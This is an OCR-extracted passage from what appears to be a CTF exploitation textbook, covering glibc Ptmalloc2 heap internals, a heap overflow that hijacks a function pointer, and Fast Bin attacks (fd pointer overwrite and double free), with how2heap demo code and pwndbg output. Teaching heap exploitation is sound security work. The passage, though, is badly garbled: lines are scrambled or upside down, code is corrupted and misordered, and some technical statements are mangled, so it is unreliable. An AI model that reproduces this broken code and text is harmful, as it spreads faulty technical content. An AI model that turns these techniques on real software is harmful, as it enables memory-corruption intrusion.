if the current chunk is allocated by mmap. PREV_INUSE is used to record whether
the previous chunk was allocated or not, the PREV_INUSE flag is O if the chunk
adjacent to the current chunk is freed, and mchunk_prev_size is the size of the freed
adjacent chunk. The heap manager can use this information to find the location of the
previous freed chunk.
There are three forms of chunk in the manager, namely allocated chunk, free
chunk and top chunk. The heap manager will return an allocated chunk with the
structure mchunk_prev_size + mchunk_size + top chunk when the user requests
memory. user_memory is the memory space available to the user. free chunk is what
exists after the allocated chunk is freed. top chunk is a very large free chunk, and
st Ao isanbu aasn o ! ds yuno doi o q paeu st aoeds r
32 (0x20) bytes. Unless otherwise specified, the objects described in this chapter
smaller than top chunk. On 64-bit systems, the minimum chunk structure is
default to 64-bit Linux operating systems.
  s o o pe pe  o  o
possible, Ptmalloc2 divides free chunks of different sizes into different bin struc-
tures, namely, Fast Bin, Small Bin, Unsorted Bin, and Large Bin.
1. Fast Bin
The size of Fast Bin chunk is 32 to 128 (0x80) bytes., If the size of the chunk meets
this requirement when it is released, the heap manager will put the chunk into Fast
Bin and will not modify the PREV_ INUSE flag bit of the next chunk after it is
released. Fast Bin of different sizes are stored in a single-chain table structure of
corresponding size, and its single-chain table access mechanism is LIFO (Last In
First Out). The fd pointer to the last chunk that was added to the Fast Bin.
2. Small Bin
Small Bin stores chunks of 32 to 1024 (0x400) bytes, and each chunk is a double-
linked structure, with chunks of different sizes stored in their corresponding links.
Since it is a double-linked structure, it is slower than Fast Bin. The access method of
the linked listis FIFO (First In First Out).
3. Large Bin
Chunk larger than 1024 (0x400) bytes are managed using Large Bin, which has the
most complex and slowest structure compared to other Bin. Large Bin of the same
size are connected using fd and bk pointers, Large Bin of different size are connected
using fd_nextsize and bk_nextsize, and Large Bin of different size are connected
using bk_nextsize and bk_nextsize. nextsize sorted connections by size.
---
## Page 473
460
6PWN
4. Unsorted Bin
Unsorted Bin is equivalent to the trash bin of Ptmalloc2 heap manager. After chunks
are freed, it will be added to the Unsorted Bin until next allocation. When the
Unsroted Bin of heap manager is not empty, user's request for non-Fast Bin memory
will be searched from Unsorted Bin first, and if a chunk (equal to or greater than)
matching the request is found, then the chunk will be allocated or divided.
6.6.2SimpleHeapOverflow
Heap overflow is the simplest and most straightforward software vulnerability. In
real software, heaps usually store various structures, and a heap overflow can
overwrite the structure and then tamper with the structure information, often
resulting in serious vulnerabilities such as remote code execution. What is a heap
overflow? How can the vulnerability be exploited after an overflow? Let's visualize
this with a simple example.
Example 6.6
#include 
#include cstdio.h>
#include 
stzuct AAA {
char buf [0x20] ;
void (*func) (char *) ;
void out (char *buf) {
puts (buf) ;
}{) u[nA pTOA
struct AAA +a = mal1oc (sizeof (stzuct A) 1 ;
read (0, a - >buf , 0x30) ;
a->func = out ;
a->func (a->buf) ;
voidmain (1 {
vuln () ;
In Example 6.6, an obvious heap overflow can be found. The size of buf in struct
AAA is 32 bytes, but 48 bytes of characters are read in. The excessively long
character directly overwrites the function pointer in the structure, which in tum
enables hijacking of the program control flow when the function pointer is called.
---
## Page 474
6.6 Heap
461
6.6.3ExploitsHeapMemoryVulnerability
This section will debug and analyze the flaws in the Ptmalloc2 heap manager at the
source code level and will also explain how to exploit these flaws for vulnerability
exploitation. The tools used in this section are pwndbg (https://github.com/pwndbg/
shellphish team. Readers can follow the CTF topics corresponding to the defects
in the how2heap.
6.6.3.1 Build Glibc Debug Environment
The following is an example of an Ubuntu 16.04 system to build a Glibc source
debugging environment. First of all, you need to install pwndbg, see the project's
homepage for detailed installation tutorials. Then download the Glibc source code,
you can directly use the following command
apt instal1 glibc-source
to install the source package. After that, you can find the glibc-2.23.tar.xz file in the /
usr/src/glibc directory (see Fig. 6.16), unzip the file and see the glibc-2.23 source
code.
In GDB, use the dir command to set the source code search path.
pwndbg> dix /usz/src/g1ibc/g1ibc-2.23/ma11oc
Source directories searched: /uar/are/glibe/glibe-2 23/malloc:$
cdir : Scvd
umoo o.qp, 0 ppe u nof uuu J0
This allows you to debug the Glibc source code at the source level (see Fig. 6.17).
dix /usr/src/g1ibc/glibc-2.23/ma11oc
Set the source code path so that you don't have to set it manually every time you
start GDB.
For other Linux distributions, you can also build a source code debugging
environment in this way. The source code packages can be found on the
Fig, 6.16 Get glibc-2.23.
[root@ubuntu16 1ib ]$ cd/usr/src/glibc
tar.xz
[rooteubuntu16 glibc]s1s
debian glibc-2.23 glibc-2.23.tar.xz
buntu16 glibc-2.23 J$
---
## Page 475
462
6PWN
push
Bx7ffff7u91132
aalloc-2
rsp,&
x7791134
x7ffff7u91136
ax7ff79129d
Bx7ffff7u91298 emol.1oc+36eb
rst,
4 ptr [rsp + e18]
mol1oc
dod
rop
2897
29
2901
NN
oid *
2
ollloc (size_t bytes)
2903
2304
20
2905
rsp
xffeu
x7rfe4
x7fffffffeis-
25）.-1e
Dxrefrrrffe428
1555540
 - effe520 - bd
7ffff7e91130
3
3
neltL.oc
7fff7o28830 1ibc_stert_noin
Fig, 6.17 Use gdb debug Glibc source code
distribution’s official website, such as the Ubuntu 16.04 libc source code at htps://
packages.ubuntu.com/xenial/ glibc-source.
6.6.3.2 Fast Bin Attack
Section 6.6.1 describes Fast Bin as a single-linked LIFO structure connected using
FD pointers. n Glibc 2.25 and earlier, after a chunk is freed, it is first determined if its
size does not exceed the size of global_max_fast, and if so, it is put into Fast Bin,
otherwise other operations are performed. The following code is an interception of
the Ptmalloc2 source code in Glibc 2.25 regarding the handling of Fast Bin. After the
size of the chunk satisfies the condition that it does not exceed global_max_fast, it
will also determine if the size of the chunk exceeds the minimum chunk and is
smaller than the system memory, and then add the chunk to the chain table of the
corresponding size.
---
## Page 476
6.6 Heap
463
/ / If less than global max fast, enter Fast Bin processing.
if ((unsigned long) (size)top)
#endif
if (_builtin_expect (chunkeize_nomask (chunk_at_offset (p, size))
[
=
av->system_mem, 0)> {
上
free_perturb (chunkc2mem (p) , size - 2 + SIzE_Sz) ;
set_fastchunks (av) ;
unsigned int idx = fastbin_index (size) : // Get the idx in the FastBin
of that size.
fb = &fastbin (av, idx) ;
// Atomica1ly 1ink P to its fastbin: P->FD = *FB; +FB = P;
mchunkptr o1d = *fb, o1d2;
unsigned int o1d_idx = ~0u;
1 op
// Check that the top of the bin is not the record we are going to add
(1.e.,
// Check if it is double free, but the last free was b, so you can bypass
double free)
this check.
if (_builtin_expect (o1d == p, 0)) {
errstr = *double free or corruption (fasttop) ";
goto errout ;
/+ Check that size of fastbin chunk at the top is the same as
size of the chunk that we are adding. He can dereference OLD
only if we have the lock, otherwise it might have already been
if (have_1ock && old ! = NULL)
deallocated. See use of OLD_IDx below for the actual check. */
o1d_idx = fastbin_index (chunksize (old) ) ;
} whi1e ( (o1d = catomic_compare_and_exchange_val_rel (fb, p, o1d2) l !
p->fd = old2 = o1d;
- o1d2) ;
1f (have_1ock && old != NULL && _builtin_expect (old_idx I= idx, 0) 1 {
errstr = *invalid fastbin entry (free) ";
goto errout;
The operation of Fast Bin is not complicated, first the memery manger determine
if the size of the request does not exceed the size of global_max_fast, if it does, we
take a chunk out of the chain table of that size. The following code verifies the
---
## Page 477
464
6PWN
legitimacy of the removed chunk. The size part of the chunk must be the same as the
size part of the chunk that should be stored in this chain table.
if (__bui1tin_expect (fastbin_index (chunksize (victim)> 1= idx, 0) )
In other words, if the table stores a chunk of size Ox70, so the size of the chunk
retrieved from the table must also be Ox70. The chunk is returmed after the size of the
chunk is determined to be legitimate (From the source code, there are many strict
checks in Ptmalloc2, but many of them need to have MALLOC_DEBUG turmed on
to take effect. This parameter is off by default, please check the Ptmalloc2 source
code for details.).
/ / If less than global max fast, enter Fast Bin processing.
if ((unsigned long)(nb) fd,
break;
victim) ) 1 = victim) ;
//Check if the size of the chunk is legal for the table.
1f (victim ! = 0) {
if (builtin_expect (fastbin_index (chunksize (victin) ) != idx, o)) {
 (4seg] uotadmtxoo Axouou : () so(eu, - 3s33e
errout :  malloc_printerr (check_action, errstr, chunk2mem (victim) ,
av) ;
return NULL;
check_rena11oced_chunk (av, victim, nb) ;
alloc_perturb (p, bytes) ;
: (wao) wwzuno = d pto
return p;
Based on the source code analysis above, we can conclude that Ptmalloc2 does
not check the legitimacy of chunks much when dealing with Fast Bin sized chunks.
Therefore, we can exploit the following flaws.
1. Modify the fd pointer
For a chunk that is already in the Fast Bin, we can modify its fd pointer to point to the
target memory, so that the next time a chunk of that size is allocated, it can be
allocated to the target memory. However, when allocating Fast Bin, Ptmalloc2 has a
check on the size of the chunk, which we can bypass by modifying the size of the
target memory
---
## Page 478
6.6Heap
465
#include 
#include 
#include 
typedef struct animal (
char dese [0x8] ;
size_t lifetime;
}Anima1 ;
void main (1 {
Animal *A = ma11oc (sizeof (Anima1)) ;
Animal +C = ma1loe (izeof (Anima11 1 :
Animal *B = ma1loc (sizeof (Anima1)) ;
memcpy (target, *THIS IS S&CR&T*, 0x10) ;
char *target = nalloc(0xl0) ;
ma11cc (0x80) ;
free (C) ;
free (B) ;
char *pay1oad = AAAAAAAAAAAAAAAAAAAAAAAA \,x21 \,x00\,x00,x00′,x00 \,x00
// ovexflov from A
\x00x00\x60" ;
memcpy (A->desc, pay1oad, 0x21) ;
Animal +E = ma11oc (sizeof (Anima1)1 ;
Animal *D = ma1loc (sizeof (Anima1)) ;
write (1, E->desc, 0x10) ;
(1) Modify fd pointer lowers
To achieve allocation to the target memory area, we need to know the target memory
address, but due to the system ASLR limitation, we need to obtain the memory
address through other vulnerabilities, which means additional vulnerabilities are
needed for exploiting. But the heap allocation is fixed in the system offset and the
address of the allocated heap memory is fixed relative to the base address of the heap
memory. By modifying the low bit of the fd pointer, we can perform an Overlap of
memory implementation attack without information leakage.
(2) Double Free List
As you can see in the previous source code for freeing the Fast Bin size of memory,
Ptmalloc2 will verify that the current chunk is the same as the last one, and if it is,
then there is a Double Free. Such a verification logic is straightforward, but it is also
easy to bypass. We can bypass such a verification by free A, then B, and finally
A. After Double Free, Fast Bin forms a single-linked ring structure, which enables
Overlap of memory. We use how2heap's code to explain this process.
---
## Page 479
466
6PWN
#include 
#include 
int main (1 
fprintf (stderr, *This file demonstrates a simple double-free attack
with fastbins. \n*) :
fprintf (stderr, *Al1ocating 3 buffers. \n") ;
int *a = ma11oc (8) ;
int *c = ma11oc (8) ;
int *b = ma11oc (8) ;
fprintf (stderr, *1st mal1oc (8) : $p\n", a) ;
fprintf (stderr, *3rd ma1loc (8) : $p^n", c) ;
fprintf (stderr, *2nd malloc (8) : &p\n", b) ;
fprintf (stderr, *Freeing the first one.. - \n*) ;
free (a) ;
the top of the free list . \na, a, a) =
fprintf (stderr, *If ve free $p again, things wi1l crash because 4p is at
/ / free (a) :
fprintf (stderr, *So, instead, we'11 free &p.\n", b) ;
free (b) ;
fprintf (stderr, *sov, we can free hp again, since it*s not the head of
the free liat,\n", a) ;
free (a) ;
fprintf (stderr, *Nou the free list has [ p, $p, p 1 . If we malloc
3 times, we'11 get &p
(a,b,a, a, a) ;
fprintf (stderr, *1st ma11oc (8) : $p\n", ma11oc (8)) ;
fprintf (stderr, *2nd ma11oc (8) : $p\n", ma11oc(8)) ;
fprintf (stderr, *3rd ma11oc (8) : $p^n", ma11loc (8)1 ;
First, after three mallocs, the memory distribution on the heap is as follows.
pwndibg> ×/20gx 0x602000
0x6 02000 :
0x0000000000000000
0×0000000000000000
0x0000000000000021
0x602010 :
0000000000000000x0
0x602020 :
0×0000000000000000
0000000000000000x0
0x00０００００００00000２１
0x6 02030 :
0x0000000000000000
0×0000000000000000
0x6 0204 0 :
0x0000000000000000
TZO0000000000000x0
0x602050 :
0x6 0206 0 :
0000000000000000x0
Teg0200000000000x0
0x602070 :
0x0000000000000000
0x000000000000000０
0x602080 :
0000000000000000x0
0x6 02090 :
0000000000000000X0
0×0000000000000000
---
## Page 480
6.6 Heap
467
After free b, the memory distribution on the heap is as follows.
pwndbg> fastbins
0x20 : 0x602020 → 0xc602000 + 0x0
fastbins
0×30 : 0x0
0×40 : 0x0
0×50 : 0x0
0×60 : 0x0
0×70 : 0x0
pxmdbg>
0x80 : 0x0
Free A again and this time set a breakpoint on the free function
Breakpoint 2 at 0x7ffff7a914f0: free. (2 1ocations) 0x50: 0x0
pwndbg> b free
After completing the free operation, you can se that the chunk has been added to the
fastbins single-linked list.
pwndbg> fastbins
0x20 : 0x602020 → 0x602000 + 0x602020 /+ + *1 +/
fastbins
0x30 : 0×0
0x40 : 0x0
0x50 : 0x0
0×60 : 0x0
0x70: 0x0